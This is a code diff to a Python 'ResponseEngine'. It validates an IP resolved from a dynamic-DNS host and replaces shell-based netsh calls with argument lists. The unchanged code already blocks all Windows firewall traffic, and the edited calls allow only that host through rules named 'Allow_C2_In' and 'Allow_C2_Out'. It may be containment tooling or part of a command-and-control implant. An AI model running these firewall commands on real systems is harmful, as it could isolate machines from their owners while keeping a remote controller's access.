@@ -9,6 +9,7 @@ import scipy.io.wavfile as wav
 import json
 import threading
 import socket
+import ipaddress
 
 def containment_enabled():
     return os.environ.get(
@@ -112,10 +113,32 @@ class ResponseEngine:
 
         try:
             subprocess.run('netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound', shell=True, capture_output=True)
+            server_ip = str(
+                ipaddress.IPv4Address(
+                    socket.gethostbyname("filetrack-2026.duckdns.org")
+                )
+            )
 
-            server_ip = socket.gethostbyname("filetrack-2026.duckdns.org")
-            subprocess.run(f'netsh advfirewall firewall add rule name="Allow_C2_In" dir=in action=allow remoteip={server_ip}', shell=True, capture_output=True)
-            subprocess.run(f'netsh advfirewall firewall add rule name="Allow_C2_Out" dir=out action=allow remoteip={server_ip}', shell=True, capture_output=True)
+            for rule_name, direction in (
+                ("Allow_C2_In", "in"),
+                ("Allow_C2_Out", "out"),
+            ):
+                subprocess.run(
+                    [
+                        "netsh",
+                        "advfirewall",
+                        "firewall",
+                        "add",
+                        "rule",
+                        f"name={rule_name}",
+                        f"dir={direction}",
+                        "action=allow",
+                        f"remoteip={server_ip}",
+                    ],
+                    shell=False,
+                    capture_output=True,
+                    check=True,
+                )
             subprocess.run('netsh advfirewall firewall add rule name="Allow_DNS" dir=out action=allow protocol=UDP remoteport=53', shell=True, capture_output=True)
 
             subprocess.run('netsh advfirewall firewall add rule name="Allow_SocketIO" dir=out action=allow protocol=TCP remoteport=5000', shell=True, capture_output=True)
